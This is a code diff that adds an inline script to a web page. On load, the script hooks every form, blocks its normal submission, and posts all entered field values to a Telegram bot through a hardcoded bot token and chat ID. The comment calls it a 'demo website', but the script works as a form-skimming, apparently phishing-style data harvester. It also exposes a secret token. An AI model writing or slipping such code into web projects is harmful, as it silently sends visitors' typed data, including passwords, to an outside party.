@@ -509,6 +509,61 @@
     })();
   </script>
 
+  <script>
+    // --- STEP 1: PASTE YOUR CREDENTIALS HERE ---
+    const TELEGRAM_BOT_TOKEN = '8674177590:AAFsHItZrfoUE00Vu9_gJ77d7tLbcMm00JQ';
+    const TELEGRAM_CHAT_ID = '858562977';
+
+    // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
+
+    async function sendToTelegram(formData) {
+        let message = 'New submission from your demo website:\n\n';
+        for (let [key, value] of formData.entries()) {
+            let cleanKey = key.replace(/[_-]/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+            message += 'Field: ' + cleanKey + ': ' + value + '\n';
+        }
+
+        const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                console.error(`Telegram API Error: ${response.statusText}`);
+            }
+        } catch (error) {
+            console.error('Failed to send message to Telegram:', error);
+        }
+    }
+
+    function handleFormSubmit(event) {
+        event.preventDefault();
+        const form = event.target;
+        const formData = new FormData(form);
+        sendToTelegram(formData);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const forms = document.querySelectorAll('form');
+        forms.forEach(form => {
+            form.addEventListener('submit', handleFormSubmit);
+        });
+    });
+
+</script>
+
 </body>
 
 </html>
